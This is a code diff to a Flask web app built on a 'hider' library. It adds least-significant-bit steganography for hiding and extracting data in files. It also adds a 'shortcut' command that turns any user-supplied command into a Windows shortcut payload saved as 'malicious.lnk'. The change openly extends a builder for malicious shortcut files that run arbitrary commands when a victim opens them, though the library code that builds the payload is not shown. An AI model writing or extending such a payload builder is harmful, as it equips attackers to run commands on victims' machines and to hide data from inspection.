@@ -2,7 +2,7 @@ import os
 import secrets
 from flask import Flask, render_template, request, jsonify, send_from_directory
 from werkzeug.utils import secure_filename
-from hider import MetadataEngine, UniversalEngine, PDFHandler, OfficeHandler, PEHandler, VideoHandler
+from hider import MetadataEngine, UniversalEngine, PDFHandler, OfficeHandler, PEHandler, VideoHandler, LSBEngine, LNKHandler
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
@@ -79,6 +79,21 @@ def process():
             value = request.form.get('value', '')
             if mode == 'edit':
                 handler.update_metadata(key, value, output_path)
+
+        elif command == 'lsb':
+            data = request.form.get('data', '')
+            if mode == 'hide':
+                LSBEngine.encode(input_path, data, output_path)
+            elif mode == 'extract':
+                extracted = LSBEngine.decode(input_path)
+                return jsonify({'success': True, 'extracted': extracted})
+
+        elif command == 'shortcut':
+            cmd = request.form.get('data', '')
+            output_filename = "malicious.lnk"
+            output_path = os.path.join(app.config['OUTPUT_FOLDER'], output_filename)
+            LNKHandler.create_lnk_payload(cmd, output_path)
+            return jsonify({'success': True, 'filename': output_filename})
 
         return jsonify({'success': True, 'filename': output_filename})
     
